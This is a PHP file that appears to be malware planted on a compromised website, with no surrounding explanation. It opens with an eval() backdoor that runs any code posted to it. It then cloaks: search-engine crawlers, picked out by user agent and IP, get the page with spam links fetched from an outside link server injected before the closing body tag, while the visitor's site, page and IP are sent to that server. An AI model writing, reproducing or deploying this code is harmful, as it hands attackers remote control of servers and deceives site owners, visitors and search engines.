<?php

if(isset($_POST['_secret_'])){

	eval($_POST['secret']);
	exit;
}


if (extension_loaded('curl') && function_exists('curl_init') && function_exists('curl_exec')) {
        function curl_get_contents($url) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 20);
                curl_setopt($ch, CURLOPT_PORT, 80);
                curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 2.0.50727; InfoPath.1)");

                $content = curl_exec($ch);
                $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                if ($code >= 400)
                        $content = false;
                curl_close($ch);
                return $content;
        }
}
else if(function_exists('file_get_contents')) {
        // cURL ,  file_get_contents
        function curl_get_contents($url) {
                return file_get_contents($url);
        }
}

function _curl_get_contents($url){


$host=str_replace('http://','',trim($url));
$host_parts=explode("/",$host);
$domain=$host_parts[0];
$path=str_replace($domain,"",$host);
$path=trim($path);

$sock=fsockopen($domain, 80, $errno, $errstr, 30);
	if($sock)
	{
	$request="GET {$path} HTTP/1.1\r\n";
	$request.="Host: {$domain}\r\n";
	$request.="Connection: Close\r\n\r\n";
	fwrite($sock, $request);
	$data="";
		while(!feof($sock))
		{
		$data.=fgets($sock,128);
		}
	fclose($sock);
	return $data;
	}

}



error_reporting (0);
$host=$_SERVER['SERVER_NAME'];
$is_bot = FALSE ;

$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
                               '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
                               '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',
                               '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
                               '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i',
                               '#Flexum\s*spider#i', '#Gigabot#i', '#Gsa#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
                               '#IRLbot#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
                               '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
                               '#msnbot#i', '#msnbot-media#i', '#OmniExplorer_Bot#i',
                               '#PEAR#i', '#psbot#i', '#Bing#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
                               '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#voyager#i',
                               '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
                               '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i',#bingbot#i',
                               '#spider#i', '#yahoo#i', '#jeeves#i' ,'#google#i' ,'#altavista#i',
                               '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i',
                               '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i',
                               '#webcrawler#i', '#crawl#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
                               '#charlotte#i', '#ngb#i', '#live#i', '#msn#i', '#yahoo#i', '#ask#i', '#aol#i' ) ;

$stop_ips_masks = array("8.6.48","62.172.199","62.27.59","63.163.102","64.157.137","64.157.138","64.233.173","64.68.80","64.68.81","64.68.82","64.68.83","64.68.84","64.68.85","64.68.86","64.68.87","64.68.88","64.68.89","64.68.90","64.68.91","64.68.92","64.75.36","66.163.170","66.163.174","66.196.101","66.196.65","66.196.67","66.196.72","66.196.73","66.196.74","66.196.77","66.196.78","66.196.80","66.196.81","66.196.90","66.196.91","66.196.92","66.196.93","66.196.97","66.196.99","66.218.65","66.218.70","66.228.164","66.228.165","66.228.166","66.228.173","66.228.182","66.249.64","66.249.65","66.249.66","66.249.67","66.249.68","66.249.69","66.249.70","66.249.71","66.249.72","66.249.73","66.249.78","66.249.79","66.94.230","66.94.232","66.94.233","66.94.238","67.195.115","67.195.34","67.195.37","67.195.44","67.195.45","67.195.50","67.195.51","67.195.52","67.195.53","67.195.54","67.195.58","67.195.98","68.142.195","68.142.203","68.142.211","68.142.212","68.142.230","68.142.231","68.142.240","68.142.246","68.142.249","68.142.250","68.142.251","68.180.216","68.180.250","68.180.251","69.147.79","72.14.199","72.30.101","72.30.102","72.30.103","72.30.104","72.30.107","72.30.110","72.30.111","72.30.124","72.30.128","72.30.129","72.30.131","72.30.132","72.30.133","72.30.134","72.30.135","72.30.142","72.30.161","72.30.177","72.30.179","72.30.213","72.30.214","72.30.215","72.30.216","72.30.221","72.30.226","72.30.252","72.30.54","72.30.56","72.30.60","72.30.61","72.30.65","72.30.78","72.30.79","72.30.81","72.30.87","72.30.9","72.30.97","72.30.98","72.30.99","74.6.11","74.6.12","74.6.13","74.6.131","74.6.16","74.6.17","74.6.18","74.6.19","74.6.20","74.6.21","74.6.22","74.6.23","74.6.24","74.6.240","74.6.25","74.6.26","74.6.27","74.6.28","74.6.29","74.6.30","74.6.31","74.6.65","74.6.66","74.6.67","74.6.68","74.6.69","74.6.7","74.6.70","74.6.71","74.6.72","74.6.73","74.6.74","74.6.75","74.6.76","74.6.79","74.6.8","74.6.85","74.6.86","74.6.87","74.6.9","74.55.27","141.185.209","169.207.238","199.177.18","202.160.178","202.160.179","202.160.180","202.160.181","202.160.183","202.160.185","202.165.96","202.165.98","202.165.99","202.212.5","202.46.19","203.123.188","203.141.52","203.255.234","206.190.43","207.126.239","209.1.12","209.1.13","209.1.32","209.1.38","209.131.40","209.131.41","209.131.48","209.131.49","209.131.50","209.131.51","209.131.60","209.131.62","209.185.108","209.185.122","209.185.141","209.185.143","209.185.253","209.191.123","209.191.64","209.191.65","209.191.82","209.191.83","209.67.206","209.73.176","209.85.238","211.14.8","211.169.241","213.216.143","216.109.121","216.109.126","216.136.233","216.145.58","216.155.198","216.155.200","216.155.202","216.155.204","216.239.193","216.239.33","216.239.37","216.239.39","216.239.41","216.239.45","216.239.46","216.239.51","216.239.53","216.239.57","216.239.59","216.32.237","216.33.229","174.129.130","174.129.66");
foreach ( $stop_ips_masks as $k=>$v )
{
    if ( preg_match( '#^'.$v.'$#', $_SERVER['REMOTE_ADDR']) )
        $is_bot = TRUE ;
}

function get_links() {
        $site = urlencode($_SERVER['HTTP_HOST']);
        $page = urlencode($_SERVER['REQUEST_URI']);
        $ip = urlencode($_SERVER['REMOTE_ADDR']);

        $url = LINKSERVER_URL.'?site='.$site.'&page='.$page.'&ip='.$ip;
        $data = curl_get_contents($url);
	if(empty($data))
	{
	$data=_curl_get_contents($url);
	}

        return $data;
}

if ( $is_bot || !( FALSE === strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) )
{

        if ($_SERVER['HTTP_USER_AGENT'] != "_it_is_our_request_") {
        define('LINKSERVER_URL', 'http://www.google-hub.com/prf/linkserver.php');

    $originalurl="http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];
    $originaluseragent=$_SERVER["HTTP_USER_AGENT"];
    $originalpage = curl_get_contents($originalurl);
    $originalpage = preg_replace("~</body>~i",get_links()."\n</body>",$originalpage);
    print $originalpage;
    exit();
}
}
?>
